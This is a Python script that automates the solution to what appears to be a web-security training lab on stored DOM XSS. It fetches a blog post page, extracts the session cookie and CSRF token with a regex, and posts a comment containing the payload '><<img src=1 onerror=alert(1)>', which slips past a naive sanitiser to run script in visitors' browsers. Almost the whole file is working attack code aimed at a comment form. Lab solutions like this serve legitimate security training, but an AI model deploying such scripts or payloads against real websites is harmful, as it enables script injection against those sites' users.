############################################################################
#
# Lab: Stored DOM XSS
#
# Hack Steps: 
#      1. Fetch a post page
#      2. Extract the session cookie and the csrf token to post a comment
#      3. Post a comment with the injected payload in the comment field
#
############################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0ab100f104994a1982eb242f00e200e7.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching a post page.. ", end="", flush=True)

    post_page = fetch_post_page()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the session cookie and the csrf token to post a comment.. ", end="", flush=True)

    session = post_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Posting a comment with the injected payload in the comment field.. ", end="", flush=True)

    payload = "><<img src=1 onerror=alert(1)>"
    data = { "comment": payload, "csrf": csrf_token, "postId": "1", "name": "Hacker", "email": "hack@me.com" }
    cookies = { "session": session }
    post_comment(data, cookies)
    fetch_post_page() # fetch again to mark the lab as solved

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch_post_page():
    try:  
        return requests.get(f"{LAB_URL}/post?postId=1")

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch a post page through exception")
        exit(1) 


def post_comment(data, cookies):
    try:
        return requests.post(f"{LAB_URL}/post/comment", data, cookies=cookies)

    except:
        print(Fore.RED + "⦗!⦘ Failed to post a comment with the injected payload in the comment field through exception")
        exit(1)


if __name__ == "__main__":
    main()

